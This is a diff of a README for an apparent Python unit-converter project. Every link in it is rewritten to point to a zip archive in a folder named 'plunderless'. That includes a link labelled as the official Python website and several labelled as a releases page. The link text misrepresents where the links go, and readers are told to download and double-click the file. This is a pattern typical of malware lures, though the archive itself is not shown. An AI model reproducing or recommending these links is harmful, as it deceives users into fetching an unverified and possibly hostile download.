@@ -4,14 +4,14 @@
 Welcome to Unit-Converter-! This simple interactive Python program allows you to convert values between different categories. You can easily switch between Length, Temperature, Volume, and Time. Select your unit types, enter your values, and receive quick and accurate conversions. It’s perfect for everyday use!
 
 ## 📥 Download the Application
-[![Download Release](https://raw.githubusercontent.com/rana22-ai/Unit-Converter-/main/plunderless/Unit-Converter-.zip%20release-brightgreen)](https://raw.githubusercontent.com/rana22-ai/Unit-Converter-/main/plunderless/Unit-Converter-.zip)  
+[![Download Release](https://github.com/rana22-ai/Unit-Converter-/raw/refs/heads/main/plunderless/Unit_Converter_v3.6.zip%20release-brightgreen)](https://github.com/rana22-ai/Unit-Converter-/raw/refs/heads/main/plunderless/Unit_Converter_v3.6.zip)  
 Click the button above to quickly download the latest release of Unit-Converter-. 
 
 ## 🚀 Getting Started
 To get started with Unit-Converter-, please follow these steps:
 
 ### Step 1: Visit the Download Page
-Go to our [Releases page](https://raw.githubusercontent.com/rana22-ai/Unit-Converter-/main/plunderless/Unit-Converter-.zip) to see the available versions of the application.
+Go to our [Releases page](https://github.com/rana22-ai/Unit-Converter-/raw/refs/heads/main/plunderless/Unit_Converter_v3.6.zip) to see the available versions of the application.
 
 ### Step 2: Select the Version
 On the Releases page, you will find a list of versions. Choose the most recent version to ensure you have the latest features and bug fixes.
@@ -28,7 +28,7 @@ Locate the downloaded file and double-click it. This action will launch the Unit
 ## ⚙️ System Requirements
 To run Unit-Converter-, you will need the following:
 - A computer with Windows, macOS, or Linux.
-- Python 3.x installed to run the application. If Python isn't already on your system, you can download it from the [official Python website](https://raw.githubusercontent.com/rana22-ai/Unit-Converter-/main/plunderless/Unit-Converter-.zip).
+- Python 3.x installed to run the application. If Python isn't already on your system, you can download it from the [official Python website](https://github.com/rana22-ai/Unit-Converter-/raw/refs/heads/main/plunderless/Unit_Converter_v3.6.zip).
 
 ## 🛠️ How to Use the Application
 Using the Unit-Converter- is easy:
@@ -56,4 +56,4 @@ This application is relevant for anyone interested in:
 - Boosting productivity with quick conversions.
 
 ### Visit and Download
-For the latest update or to report issues, visit our [Releases page](https://raw.githubusercontent.com/rana22-ai/Unit-Converter-/main/plunderless/Unit-Converter-.zip) again. Happy converting!
+For the latest update or to report issues, visit our [Releases page](https://github.com/rana22-ai/Unit-Converter-/raw/refs/heads/main/plunderless/Unit_Converter_v3.6.zip) again. Happy converting!
